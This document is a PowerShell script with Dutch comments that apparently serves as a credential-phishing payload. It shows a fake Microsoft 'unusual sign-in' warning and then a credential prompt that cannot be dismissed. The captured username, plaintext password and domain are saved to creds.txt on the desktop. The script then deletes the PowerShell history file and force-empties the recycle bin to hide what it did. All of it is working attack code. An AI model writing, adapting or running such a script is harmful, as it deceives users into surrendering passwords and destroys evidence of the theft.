# Dynamisch pad voor het bureaublad van de huidige gebruiker
$DesktopPath = [Environment]::GetFolderPath('Desktop')
$FileName = "creds.txt"
$FullPath = Join-Path -Path $DesktopPath -ChildPath $FileName

# Controleer of het bestand al bestaat
if (Test-Path -Path $FullPath) {
    exit
}

# Functie: Vraag om gebruikersreferenties (kan niet worden gesloten zonder invoer)
function Get-Creds {
    Add-Type -AssemblyName System.Windows.Forms
    while ($true) {
        $cred = $host.ui.PromptForCredential(
            'Mislukte authenticatie', 
            'Voer uw referenties in om verder te gaan.', 
            [Environment]::UserDomainName + '\' + [Environment]::UserName, 
            ""
        )

        # Als de gebruiker de prompt sluit of annuleert, heropen het venster
        if ($cred -eq $null) {
            continue
        }

        $password = $cred.GetNetworkCredential().Password

        # Controleer of het wachtwoord leeg is
        if (![string]::IsNullOrWhiteSpace($password)) {
            return @{
                Gebruikersnaam = $cred.UserName
                Wachtwoord = $password
                Domein = $cred.GetNetworkCredential().Domain
            }
        } else {
            [System.Windows.Forms.MessageBox]::Show("Het wachtwoord mag niet leeg zijn. Probeer het opnieuw.", "Fout", 0, 16)
        }
    }
}

# Functie: Wacht op muisbeweging
function Wait-ForMouseMovement {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPosition = [System.Windows.Forms.Cursor]::Position

    while ($true) {
        Start-Sleep -Milliseconds 200
        $currentPosition = [System.Windows.Forms.Cursor]::Position
        if (($currentPosition.X -ne $originalPosition.X) -or ($currentPosition.Y -ne $originalPosition.Y)) {
            break
        }
    }
}

# Functie: Zet CapsLock uit indien nodig
function Caps-Off {
    Add-Type -AssemblyName System.Windows.Forms
    if ([System.Windows.Forms.Control]::IsKeyLocked('CapsLock')) {
        $key = New-Object -ComObject WScript.Shell
        $key.SendKeys('{CapsLock}')
    }
}

# Scriptuitvoering
Wait-ForMouseMovement > $null  # Wacht tot er muisbeweging wordt gedetecteerd
Start-Sleep -Seconds 5 > $null # Voeg 5 seconden vertraging toe
Caps-Off               > $null  # Zorg dat CapsLock uitstaat
Add-Type -AssemblyName System.Windows.Forms > $null  # Laad assembly, geen output

# Toon pop-up na de vertraging
[System.Windows.Forms.MessageBox]::Show("Ongebruikelijke aanmelding gedetecteerd. Verifieer uw Microsoft-account.") > $null

$creds = Get-Creds

# Bewaar de verzamelde gegevens op het bureaublad
try {
    $creds | Format-Table | Out-File -FilePath $FullPath -Encoding UTF8 -Append
} catch {
    # Fouten worden niet weergegeven
}

# Schoonmaakacties
try {
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue > $null
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue > $null
} catch {
    # Fouten worden niet weergegeven
}
